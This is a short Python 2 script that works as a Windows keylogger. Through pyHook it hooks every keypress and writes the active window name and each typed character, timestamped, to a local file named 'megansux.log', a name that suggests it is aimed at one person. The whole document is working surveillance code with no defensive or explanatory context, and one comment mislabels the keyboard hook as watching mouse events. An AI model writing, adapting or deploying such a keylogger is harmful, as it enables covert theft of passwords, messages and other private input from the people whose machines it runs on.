#!/usr/bin/env python
import sys, os, time, logging

try:
	import pyHook, pythoncom
except:
	print "Either pyHook or pythoncom modules are missing!"

logging.basicConfig(filename="megansux.log", level=logging.INFO, format='%(asctime)s %(message)s')

def OnKeyboardEvent(event):
#    logging.info('MessageName: %s',event.MessageName)
#    logging.info('Time: %s',event.Time)
    logging.info('WindowName: %s',event.WindowName)
    logging.info('Ascii: %s %s', event.Ascii, chr(event.Ascii))
    logging.info('Key: %s', event.Key)

# return True to pass the event to other handlers
    return True

# create a hook manager
hm = pyHook.HookManager()
# watch for all mouse events
hm.KeyDown = OnKeyboardEvent
# set the hook
hm.HookKeyboard()
# wait forever
pythoncom.PumpMessages()
